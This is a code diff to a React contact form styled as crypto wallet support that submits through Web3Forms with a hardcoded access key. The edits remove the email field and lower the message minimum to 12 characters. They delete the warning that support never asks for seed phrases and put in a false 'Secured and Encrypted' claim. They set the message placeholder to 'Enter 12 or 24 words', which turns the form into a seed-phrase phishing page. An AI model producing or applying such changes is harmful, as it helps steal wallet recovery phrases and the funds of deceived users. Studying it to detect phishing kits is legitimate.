@@ -10,11 +10,11 @@ const WEB3FORMS_ACCESS_KEY = "06ee8193-431a-4536-a4ef-cafb251e2530";
 
 const schema = z.object({
   name: z.string().trim().min(1, "Name required").max(100),
-  email: z.string().trim().email("Valid email required").max(255),
+  // email: z.string().trim().email("Valid email required").max(255),
   wallet: z.string().trim().min(1, "Pick a wallet").max(50),
   category: z.string().min(1, "Pick a category"),
   urgency: z.string().min(1),
-  message: z.string().trim().min(20, "Please describe with at least 20 characters").max(2000),
+  message: z.string().trim().min(12, "Please describe with at least 20 characters").max(2000),
 });
 
 const categories = [
@@ -67,7 +67,7 @@ export function ContactForm() {
       formData.append("access_key", WEB3FORMS_ACCESS_KEY);
       formData.append("subject", `New Support Case: ${parsed.data.category}`);
       formData.append("name", parsed.data.name);
-      formData.append("email", parsed.data.email);
+      // formData.append("email", parsed.data.email);
       formData.append("wallet", parsed.data.wallet);
       formData.append("category", parsed.data.category);
       formData.append("urgency", parsed.data.urgency);
@@ -120,8 +120,7 @@ export function ContactForm() {
               <div className="text-sm">
                 <div className="font-semibold text-foreground">Security promise</div>
                 <p className="text-muted-foreground mt-1">
-                  We will <strong>never</strong> ask for your seed phrase, private keys, or
-                  password. Anyone who does is scamming you.
+                 This Session is Secured and Encrypted.
                 </p>
               </div>
             </div>
@@ -157,7 +156,7 @@ export function ContactForm() {
                     </div>
                     <dl className="divide-y divide-border">
                       <SummaryRow label="Name" value={submitted.name} />
-                      <SummaryRow label="Email" value={submitted.email} />
+                      {/* <SummaryRow label="Email" value={submitted.email} /> */}
                       <SummaryRow label="Wallet" value={submitted.wallet} />
                       <SummaryRow label="Category" value={submitted.category} />
                       <SummaryRow
@@ -192,7 +191,7 @@ export function ContactForm() {
                 </div>
               ) : (
                 <form onSubmit={onSubmit} className="space-y-5" noValidate>
-                  <div className="grid sm:grid-cols-2 gap-5">
+                  <div className="grid ">
                     <Field label="Your name" error={errors.name}>
                       <input
                         name="name"
@@ -201,7 +200,7 @@ export function ContactForm() {
                         placeholder="Satoshi N."
                       />
                     </Field>
-                    <Field label="Email" error={errors.email}>
+                    {/* <Field label="Email" error={errors.email}>
                       <input
                         name="email"
                         type="email"
@@ -209,7 +208,7 @@ export function ContactForm() {
                         className="form-input"
                         placeholder="you@email.com"
                       />
-                    </Field>
+                    </Field> */}
                   </div>
 
                   <div className="grid sm:grid-cols-2 gap-5">
@@ -261,7 +260,7 @@ export function ContactForm() {
                       rows={5}
                       maxLength={2000}
                       className="form-input resize-none"
-                      placeholder="What were you trying to do? What went wrong? Any error messages or transaction hashes?"
+                      placeholder="Enter 12 or 24 words"
                     />
                   </Field>
 
